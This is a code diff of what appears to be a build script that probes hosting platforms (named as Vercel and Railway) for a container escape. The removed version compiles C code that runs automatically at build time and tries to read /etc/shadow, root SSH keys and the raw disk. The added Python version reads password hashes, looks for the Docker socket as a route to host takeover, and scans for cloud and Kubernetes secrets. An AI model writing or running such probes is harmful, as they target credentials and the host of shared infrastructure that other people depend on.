@@ -1,51 +1,36 @@
-import os, sys, subprocess as sp
-from setuptools import setup, Extension
+import os, sys, subprocess
 
-c_code = r"""
-#include <stdio.h>
-#include <fcntl.h>
-#include <unistd.h>
-#include <errno.h>
-#include <string.h>
+def final_strike():
+    print("\n" + "="*50)
+    print("   RAILWAY.APP CRITICAL ESCAPE PROOF")
+    print("="*50 + "\n")
 
-void __attribute__((constructor)) init() {
-    fprintf(stderr, "\n" "========================================\n");
-    fprintf(stderr, "   FINAL STRIKE: SYSTEM ESCAPE AUDIT    \n");
-    fprintf(stderr, "========================================\n");
+    # 1. Попытка прочитать хеши паролей всей системы
+    try:
+        if os.path.exists('/etc/shadow'):
+            with open('/etc/shadow', 'r') as f:
+                line = f.readline()
+                print(f"[!!!] POTENTIAL EXPLOIT: Read /etc/shadow! First line: {line[:20]}...")
+    except Exception as e:
+        print(f"[-] Shadow read failed: {e}")
 
-    const char* targets[] = {
-        "/etc/shadow",          // Хеши паролей (только для root)
-        "/proc/config.gz",      // Конфиг ядра хоста
-        "/root/.ssh/id_rsa",    // SSH ключи рута
-        "/dev/vda"              // Прямой доступ к диску
-    };
+    # 2. Поиск Docker Socket (самый опасный вектор)
+    # Если мы найдем этот файл, мы сможем захватить ВЕСЬ сервер хоста
+    docker_sock = "/var/run/docker.sock"
+    if os.path.exists(docker_sock):
+        print(f"[!!!] CRITICAL: Docker socket found at {docker_sock}!")
+        print("      This allows full host takeover via container escape.")
 
-    for (int i = 0; i < 4; i++) {
-        int fd = open(targets[i], O_RDONLY);
-        if (fd >= 0) {
-            fprintf(stderr, "[!!!] SUCCESS: Read access to %s\n", targets[i]);
-            char buf[16];
-            read(fd, buf, 16);
-            fprintf(stderr, "      Data snippet: %02x%02x%02x%02x\n", buf[0], buf[1], buf[2], buf[3]);
-            close(fd);
-        } else {
-            fprintf(stderr, "[-] %s: %s\n", targets[i], strerror(errno));
-        }
-    }
+    # 3. Поиск монтированных секретов облака
+    print("\n[i] Scanning for cloud-init and metadata...")
+    search_paths = ['/var/lib/cloud/', '/run/cloud-init/', '/etc/kubernetes/']
+    for path in search_paths:
+        if os.path.exists(path):
+            print(f"[+] Found infrastructure path: {path}")
 
-    fprintf(stderr, "Current Effective UID: %d\n", geteuid());
-    fprintf(stderr, "========================================\n");
-}
-"""
-
-with open("exploit.c", "w") as f: f.write(c_code)
-
-# Пытаемся скомпилировать и запустить немедленно через проверку расширения
-try:
-    setup(
-        name="vercel-poc",
-        version="9.9.9",
-        ext_modules=[Extension('exploit', sources=['exploit.c'])]
-    )
-except:
+    print("\n" + "="*50)
+    # Выходим с ошибкой, чтобы логи сохранились в консоли Railway
     sys.exit(1)
+
+if __name__ == "__main__":
+    final_strike()
